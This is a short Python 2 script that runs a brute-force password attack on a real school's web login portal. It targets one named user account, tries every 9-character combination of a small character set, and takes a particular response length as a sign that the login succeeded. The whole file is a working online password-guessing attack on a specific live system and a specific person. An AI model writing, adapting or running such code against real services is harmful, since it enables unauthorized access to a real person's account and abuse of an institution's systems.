import cookielib
import urllib
import urllib2
import itertools

def login(passwd):
	cj = cookielib.CookieJar()
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))

	#opener.addheaders = [('User-agent', 'RedditTesting')]
	user = 'patrick.zierahn'
	urllib2.install_opener(opener)

	authentication_url = 'https://goethe-schule-harburg.de/idesk/'

	payload = {
	  'login_act': 'patrick.zierahn',
	  'login_pwd': passwd
	  }

	data = urllib.urlencode(payload)
	req = urllib2.Request(authentication_url, data)

	resp = urllib2.urlopen(req)
	contents = resp.readlines()
	return contents

def bruteforce(charset, maxlength):
    return (''.join(candidate)
        for candidate in itertools.chain.from_iterable(itertools.product(charset, repeat=i)
        for i in range(maxlength, maxlength + 1)))

for i in list(bruteforce('abl213', 9)):
	print "check", i
	if len(login(i)) == 15:
		print "passwort:"
		print i
		exit()
